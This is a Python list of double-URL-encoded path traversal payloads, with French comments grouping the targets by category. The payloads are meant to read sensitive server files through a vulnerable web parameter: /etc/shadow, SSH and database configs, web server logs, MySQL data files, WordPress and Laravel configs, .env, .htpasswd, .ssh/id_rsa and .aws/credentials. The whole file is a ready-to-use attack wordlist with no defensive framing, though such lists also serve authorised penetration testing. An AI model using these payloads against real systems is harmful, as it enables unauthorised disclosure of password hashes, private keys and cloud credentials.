traversals_2_encoded = [
    # ==============================
    # 1. FICHIERS SYSTÈME CRITIQUES
    # ==============================
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/shadow",                   # Hashs mots de passe (root requis)
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/group",                    # Groupes
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/hostname",                 # Nom de la machine
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/hosts",                    # Résolution locale
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/resolv.conf",              # DNS
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/os-release",               # Infos OS
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/issue",                    # Bannière login

    # ==============================
    # 2. CONFIG RÉSEAU & SERVICES
    # ==============================
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/network/interfaces",       # Interfaces réseau (Debian/Ubuntu)
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/sysctl.conf",              # Paramètres kernel
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/services",                 # Liste des ports/services
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/ssh/sshd_config",          # Config SSH

    # ==============================
    # 3. LOGS SYSTÈME
    # ==============================
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/syslog",               # Debian/Ubuntu
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/messages",             # RedHat/CentOS
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/auth.log",             # Authentification
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/secure",               # Sécurité (RedHat)
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/dmesg",                # Logs kernel
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/apache2/error.log",    # Logs Apache Debian/Ubuntu
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/httpd/error_log",      # Logs Apache RedHat
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/nginx/error.log",      # Logs Nginx
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/log/mysql/error.log",      # Logs MySQL

    # ==============================
    # 4. FICHIERS WEB
    # ==============================
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/index.html",      # Page par défaut
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/index.php",       # Page PHP
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/config.php",      # Config PHP
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/apache2/apache2.conf",     # Config Apache Debian/Ubuntu
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/httpd/conf/httpd.conf",    # Config Apache RedHat
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/nginx/nginx.conf",         # Config Nginx
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/php/7.4/apache2/php.ini",  # PHP config (Debian/Ubuntu exemple)
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/php/8.1/fpm/php.ini",      # PHP config (Debian/Ubuntu récent)
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/php.ini",                  # PHP config générique

    # ==============================
    # 5. BASES DE DONNÉES (SQL)
    # ==============================
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mysql/mysql/user.MYD",       # MySQL users
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mysql/mysql/user.frm",       # MySQL users structure
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mysql/mysql.db",             # DB principales
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mysql/mysql/user.ibd",       # Table user
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mysql/ibdata1",              # Données globales MySQL
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mysql/ib_logfile0",          # Logs InnoDB
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mysql/ib_logfile1",          # Logs InnoDB
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/mysql/my.cnf",                   # Config MySQL (Debian/Ubuntu)
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/my.cnf",                         # Config MySQL générique
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/postgresql/data/pg_hba.conf",# Config PostgreSQL
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/postgresql/data/postgresql.conf", # Config PostgreSQL
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/postgresql/data/base",       # Bases PostgreSQL
    "..%252f..%252f..%252f..%252f..%252f..%252fdata/data/com.mysql/databases.db",   # MySQL sur Android
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/db.sqlite3",            # SQLite Django
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/database.sqlite",       # SQLite générique
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/storage/database.sqlite", # Laravel SQLite
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/db.sql",
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/backup.sql",
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/mongodb/mongod.lock",
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/lib/redis/dump.rdb",
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/sql_dump.sql",
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/backup/db_backup.sql",
    
    # ==============================
    # 6. CMS POPULAIRES
    # ==============================

    # WordPress
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/wp-config.php",         # Config WordPress
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/wp-content/uploads",    # Uploads WP
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/wp-includes/version.php", # Version WP

    # Drupal
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/sites/default/settings.php",

    # Joomla
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/configuration.php",

    # Magento
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/app/etc/env.php",

    # Laravel
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/.env",                  # Config Laravel
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/storage/logs/laravel.log",

    # Django
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/www/html/settings.py",           # Django settings

    # ==============================
    # 7. FICHIERS SENSIBLES GÉNÉRIQUES
    # ==============================
    "..%252f..%252f..%252f..%252f..%252f..%252f.env",                               # Fichier d'env générique
    "..%252f..%252f..%252f..%252f..%252f..%252fconfig.json",                        # Config JSON générique
    "..%252f..%252f..%252f..%252f..%252f..%252fconfig.php",                         # Config PHP générique
    "..%252f..%252f..%252f..%252f..%252f..%252fsettings.py",                        # Config Django
    "..%252f..%252f..%252f..%252f..%252f..%252fdatabase.yml",                       # Rails config DB
    "..%252f..%252f..%252f..%252f..%252f..%252fcomposer.json",                      # PHP dépendances
    "..%252f..%252f..%252f..%252f..%252f..%252fpackage.json",                       # NodeJS dépendances
    "..%252f..%252f..%252f..%252f..%252f..%252f.git/config",                        # Config Git
    "..%252f..%252f..%252f..%252f..%252f..%252f.htaccess",                          # Fichier Apache
    "..%252f..%252f..%252f..%252f..%252f..%252f.htpasswd",                          # Mots de passe Apache

    # ==============================
    # 8. CRON JOBS
    # ==============================
    "..%252f..%252f..%252f..%252f..%252f..%252fetc/crontab",
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/spool/cron/root",
    "..%252f..%252f..%252f..%252f..%252f..%252fvar/spool/cron/crontabs/root",
    
    # ==============================
    # 9. OTHERS
    # ==============================
    "..%252f.htaccess", "..%252f..%252f.htaccess",
    "..%252f.htpasswd", "..%252f..%252f.htpasswd",
    "..%252f.user.ini", "..%252f..%252f.user.ini",
    "..%252fweb.config", "..%252f..%252fweb.config",
    
    # Fichiers config
    "..%252f.env", "..%252f..%252f.env",
    "..%252fconfig.php", "..%252f..%252fconfig.php",
    "..%252fsettings.php", "..%252f..%252fsettings.php",
    "..%252fwp-config.php", "..%252f..%252fwp-config.php",
    "..%252fconfiguration.php", "..%252f..%252fconfiguration.php",
    "..%252fenv.php", "..%252f..%252fenv.php",

    # Logs
    "..%252ferror.log", "..%252f..%252ferror.log",
    "..%252fdebug.log", "..%252f..%252fdebug.log",
    "..%252flaravel.log", "..%252f..%252flaravel.log",

    # Backups
    "..%252fbackup.zip", "..%252f..%252fbackup.zip",
    "..%252fconfig.php.bak", "..%252f..%252fconfig.php.bak",
    "..%252fwp-config.php.old", "..%252f..%252fwp-config.php.old",

    # Credentials
    "..%252f.git/config", "..%252f..%252f.git/config",
    "..%252f.ssh/id_rsa", "..%252f..%252f.ssh/id_rsa",
    "..%252f.aws/credentials", "..%252f..%252f.aws/credentials",

    # CMS
    "..%252fwp-content/debug.log", "..%252f..%252fwp-content/debug.log",
    "..%252fsites/default/settings.php", "..%252f..%252fsites/default/settings.php",
    "..%252fstorage/logs/laravel.log", "..%252f..%252fstorage/logs/laravel.log",

    # Temp
    "..%252fdebug.php", "..%252f..%252fdebug.php"
    
]